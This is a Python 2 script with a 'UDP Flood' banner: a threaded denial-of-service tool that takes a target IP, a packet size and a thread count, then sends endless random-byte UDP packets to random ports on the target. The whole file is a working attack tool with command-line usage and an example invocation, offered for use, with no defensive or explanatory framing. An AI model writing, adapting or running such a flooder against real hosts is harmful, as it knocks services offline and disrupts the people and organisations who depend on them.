#-*-coding: utf8-*-
from thread import start_new_thread as thread
from socket import socket, AF_INET, SOCK_DGRAM
from sys import argv, stdout
from os import _exit, system
from platform import system as plt
import random

def banner():
	if plt() == "Windows":
		system("cls")
	else:
		system("clear")
	print "\n        (      (    (                         "
	print "        )\ )   )\ ) )\ )  (             (     "
	print "    (  (()/(  (()/((()/(  )\            )\ )  "
	print "    )\  /(_))  /(_))/(_))((_) (    (   (()/(  "
	print " _ ((_)(_))_  (_)) (_))_| _   )\   )\   ((_)) "
	print "| | | | |   \ | _ \| |_  | | ((_) ((_)  _| |  "
	print "| |_| | | |) ||  _/| __| | |/ _ \/ _ \/ _` |  "
	print " \___/  |___/ |_|  |_|   |_|\___/\___/\__,_|  "



def show_help(name_scp):
	print "\nUsage: %s [options]\n"%(name_scp)
	print "Options:"
	print " -i, --ip         Host ip to attack"
	print " -b, --bytes      Number of bytes to send in attack"
	print " -t, --threads    Number of threads\n"
	print "Example: %s -i 192.168.0.100 -b 2048 -t 25"%(name_scp)
	_exit(0)

def udp(ip, nbytes):
	while 1:
		s = socket(AF_INET, SOCK_DGRAM)
		port = random.randint(80, 8080)
		bytes_ = random._urandom(nbytes)
		stdout.write("\rSending %i bytes to %s:%i"%(len(bytes_), ip, port))
		s.sendto(bytes_, (ip, port))
		s.close()

index = 1
name_scp = argv[0].split("\\")[len(argv[0].split("\\")) - 1]
banner()

for arg in argv:
	if arg == "-i" or arg == "--ip":
		ip = argv[index+1]
		index += 2
	elif arg == "-b" or arg == "--bytes":
		nbytes = int(argv[index+1])
		index += 2
	elif arg == "-t" or arg == "--threads":
		nthreads = int(argv[index+1])
		index += 2
	elif arg == "-h" or arg == "--help":
		show_help(name_scp)

try:
	try:
		print "\n[+] Attack was started type Ctrl-c to stop\n"
		for x in xrange(nthreads):
			thread(udp, (ip, nbytes,))

		while 1:
			pass
	except NameError:
		print "\n%s -h for help"%(name_scp)
		_exit(0)

except KeyboardInterrupt:
	_exit(0)